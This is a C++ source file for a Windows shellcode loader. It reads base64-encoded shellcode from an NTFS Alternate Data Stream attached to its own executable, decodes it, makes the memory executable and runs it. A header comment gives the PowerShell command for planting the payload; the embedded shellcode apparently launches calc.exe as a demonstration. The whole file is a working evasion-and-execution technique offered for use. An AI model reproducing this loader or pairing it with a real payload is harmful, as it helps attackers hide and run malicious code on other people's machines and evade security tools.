/*Shellcode loader that retrieves base64-encoded shellcode from its own Alternate Data Stream named 'sc'
* Add the ADS after compilation with PowerShell: 
* Set-Content -Path "C:\Users\admin\source\repos\shellcode_from_ads\x64\Release\shellcode_from_ads.exe" -Stream "sc" -Value "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA"
*/

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <iostream>

#pragma comment(lib, "Crypt32.lib")

int b64decode(const PBYTE src, UINT srcLen, PCHAR Dest, UINT DestLen)
{
	BOOL ret = FALSE;
	DWORD lenOut = DestLen;

	ret = CryptStringToBinaryA((LPCSTR)src, srcLen, CRYPT_STRING_BASE64, (PBYTE)Dest, &lenOut, NULL, NULL);
	if (!ret)
	{
		printf("Base64 Decoding Error: %d\n", GetLastError());
		return 1;
	}

	return lenOut;
}


int main()
{
	wchar_t filePath[MAX_PATH];
	if (GetModuleFileNameW(NULL, filePath, MAX_PATH) == 0)
	{
		printf("Error getting path to self: %d\n", GetLastError());
		return 1;
	}

	std::wstring targetPath = std::wstring(filePath) + L":sc";
	HANDLE hSelf = CreateFileW(targetPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hSelf == INVALID_HANDLE_VALUE)
	{
		printf("Error getting a handle to itself: %d\n", GetLastError());
		return 1;
	}

	unsigned char sc[1024];

	LPVOID newMem = VirtualAlloc(NULL, sizeof(sc), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (newMem == NULL)
	{
		printf("Error allocating memory for shellcode: %d\n", GetLastError());
		CloseHandle(hSelf);
		VirtualFree(newMem, sizeof(sc), MEM_RELEASE);
		return 1;
	}

	DWORD dNumBytesRead = 0;
	if (!ReadFile(hSelf, newMem, 1024, &dNumBytesRead, NULL))
	{
		printf("Error reading shellcode from ADS: %d\n", GetLastError());
		CloseHandle(hSelf);
		VirtualFree(newMem, sizeof(sc), MEM_RELEASE);
		return 1;
	}
	
	BOOL b64Ret = b64decode((const PBYTE)newMem, (UINT)sizeof(sc), (PCHAR)newMem, (UINT)sizeof(sc));
	if (!b64Ret)
	{
		printf("Error base64 decoding payload: %d\n", GetLastError());
		CloseHandle(hSelf);
		VirtualFree(newMem, sizeof(sc), MEM_RELEASE);
		return 1;
	}

	DWORD dwOldProtect = 0;
	if (!VirtualProtect(newMem, sizeof(sc), PAGE_EXECUTE_READ, &dwOldProtect))
	{
		printf("Error making memory executable: %d\n", GetLastError());
		CloseHandle(hSelf);
		VirtualFree(newMem, sizeof(sc), MEM_RELEASE);
		return 1;
	}

	((void(*)())newMem)();

	return 0;
}